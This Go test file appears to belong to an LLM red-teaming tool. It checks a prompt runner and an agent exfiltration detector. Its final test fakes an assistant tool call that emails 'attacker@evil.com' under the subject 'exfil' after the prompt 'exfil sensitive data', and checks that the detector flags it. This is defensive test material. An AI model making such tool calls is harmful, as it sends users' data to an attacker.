package probes_test

import (
	"context"
	"errors"
	"testing"

	agentdet "github.com/praetorian-inc/augustus/internal/detectors/agent"
	"github.com/praetorian-inc/augustus/pkg/attempt"
	"github.com/praetorian-inc/augustus/pkg/probes"
	"github.com/praetorian-inc/augustus/pkg/registry"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// mockGen is a mock implementation of types.Generator for testing.
type mockGen struct {
	generateFunc func(ctx context.Context, conv *attempt.Conversation, n int) ([]attempt.Message, error)
	err          error
}

func (m *mockGen) Generate(ctx context.Context, conv *attempt.Conversation, n int) ([]attempt.Message, error) {
	if m.generateFunc != nil {
		return m.generateFunc(ctx, conv, n)
	}
	if m.err != nil {
		return nil, m.err
	}
	return []attempt.Message{{Content: "mock response"}}, nil
}

func (m *mockGen) ClearHistory() {}

func (m *mockGen) Name() string {
	return "mock-generator"
}

func (m *mockGen) Description() string {
	return "Mock generator for testing"
}

func TestRunPrompts_Basic(t *testing.T) {
	gen := &mockGen{}
	prompts := []string{"prompt1", "prompt2", "prompt3"}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", nil)

	require.NoError(t, err)
	assert.Len(t, attempts, 3, "should return one attempt per prompt")

	for i, att := range attempts {
		assert.Equal(t, prompts[i], att.Prompt, "prompt should match input")
		assert.Equal(t, []string{prompts[i]}, att.Prompts, "prompts slice should contain single prompt")
		assert.Equal(t, []string{"mock response"}, att.Outputs, "should contain generator response")
		assert.Equal(t, attempt.StatusComplete, att.Status, "status should be complete")
		assert.Empty(t, att.Error, "error should be empty")
		assert.Equal(t, "test-probe", att.Probe, "probe name should be set")
		assert.Equal(t, "test-detector", att.Detector, "detector should be set")
	}
}

func TestRunPrompts_GeneratorError(t *testing.T) {
	expectedErr := errors.New("generation failed")
	gen := &mockGen{err: expectedErr}
	prompts := []string{"prompt1"}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", nil)

	require.NoError(t, err, "RunPrompts should not return error on generation failure")
	require.Len(t, attempts, 1)

	att := attempts[0]
	assert.Equal(t, attempt.StatusError, att.Status, "status should be error")
	assert.Contains(t, att.Error, "generation failed", "error message should contain generator error")
	assert.Empty(t, att.Outputs, "outputs should be empty on error")
}

func TestRunPrompts_ContextCancellation(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	gen := &mockGen{}
	prompts := []string{"prompt1"}

	attempts, err := probes.RunPrompts(ctx, gen, prompts, "test-probe", "test-detector", nil)

	require.Error(t, err, "should return error when context is cancelled")
	assert.Contains(t, err.Error(), "context canceled", "error should indicate context cancellation")
	assert.Empty(t, attempts, "should not return attempts when context cancelled")
}

func TestRunPrompts_MetadataFn(t *testing.T) {
	gen := &mockGen{}
	prompts := []string{"prompt1", "prompt2"}

	// MetadataFn that adds custom metadata to each attempt
	metadataFn := func(i int, prompt string, att *attempt.Attempt) {
		att.Metadata["test_key"] = "test_value"
		att.Metadata["prompt_length"] = len(prompt)
		att.Metadata["index"] = i
	}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", metadataFn)

	require.NoError(t, err)
	require.Len(t, attempts, 2)

	for i, att := range attempts {
		// Verify custom metadata was added
		assert.Equal(t, "test_value", att.Metadata["test_key"], "custom metadata should be present")
		assert.Equal(t, len(prompts[i]), att.Metadata["prompt_length"], "prompt length should be recorded")
		assert.Equal(t, i, att.Metadata["index"], "index should be recorded")
	}
}

func TestRunPrompts_EmptyPrompts(t *testing.T) {
	gen := &mockGen{}
	prompts := []string{}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", nil)

	require.NoError(t, err)
	assert.Empty(t, attempts, "should return empty slice for empty prompts")
}

// TestToolCallsBridge_GeneratorMetadataDetector_RoundTrip is the integration
// test that would have FAILED on commit 65bb093 (pre-bridge).
//
// Before the bridge (65bb093), generators returned tool calls in a
// provider-specific format (e.g. goopenai.ToolCall) that was never written into
// attempt.Metadata[MetadataKeyToolCalls]. Detector unit tests were seeding that
// metadata directly, so they passed even though no generator ever wrote it.
// This test closes the gap by exercising the full pipeline:
//
//  1. A mock generator returns an attempt.Message with ToolCalls already in the
//     canonical shape (as produced by attackengine.NormalizeOpenAIToolCalls).
//  2. RunPrompts propagates those ToolCalls into attempt.Metadata via the
//     collectToolCalls/WithMetadata bridge path.
//  3. agent.ArgumentExfiltrationDetector reads the metadata and fires a score
//     of 1.0 because the argument contains a forbidden domain.
//
// On pre-bridge code the mock generator's ToolCalls would never reach the
// attempt metadata, the detector would see no tool calls, and all scores would
// be 0.0 — causing the assertion below to fail.
func TestToolCallsBridge_GeneratorMetadataDetector_RoundTrip(t *testing.T) {
	// Build the canonical tool-call shape — this is exactly what the real
	// openai generator stores in Message.ToolCalls after calling
	// attackengine.NormalizeOpenAIToolCalls. We verify that NormalizeOpenAIToolCalls
	// produces this shape in the unit tests in internal/attackengine/toolcalls_test.go.
	// Here we confirm the shape flows end-to-end through RunPrompts into the detector.
	canonicalToolCalls := []map[string]any{
		{
			"name": "send_email",
			"args": map[string]any{
				"to":      "attacker@evil.com",
				"subject": "exfil",
			},
		},
	}

	// Step 2: Mock generator returns a message carrying the canonical tool calls.
	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			msg := attempt.Message{
				Role:      attempt.RoleAssistant,
				Content:   "",
				ToolCalls: canonicalToolCalls,
			}
			return []attempt.Message{msg}, nil
		},
	}

	// RunPrompts exercises the bridge: it calls collectToolCalls(responses) and
	// a.WithMetadata(attempt.MetadataKeyToolCalls, ...).
	attempts, err := probes.RunPrompts(
		context.Background(),
		gen,
		[]string{"exfil sensitive data"},
		"agent.exfil-probe",
		"agent.ArgumentExfiltration",
		nil,
	)
	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)

	// Verify the bridge wrote the tool calls into metadata.
	rawMeta, ok := a.Metadata[attempt.MetadataKeyToolCalls]
	require.True(t, ok, "bridge must write tool_calls into attempt metadata; pre-bridge code never did this")

	metaSlice, ok := rawMeta.([]map[string]any)
	require.True(t, ok, "tool_calls metadata must be []map[string]any")
	require.Len(t, metaSlice, 1)
	assert.Equal(t, "send_email", metaSlice[0]["name"])

	// Step 3: Run the real detector against the attempt produced by RunPrompts.
	// The attempt already has one output from the generator (empty content string);
	// the detector scores one entry per output.
	require.Len(t, a.Outputs, 1, "RunPrompts should have recorded the generator's response")

	det, err := agentdet.NewArgumentExfiltration(registry.Config{})
	require.NoError(t, err)

	scores, err := det.Detect(context.Background(), a)
	require.NoError(t, err)
	require.Len(t, scores, 1)
	assert.Equal(t, 1.0, scores[0],
		"detector must score 1.0 when tool call argument contains a forbidden domain; "+
			"on pre-bridge code (65bb093) metadata was never populated so this would be 0.0")
}
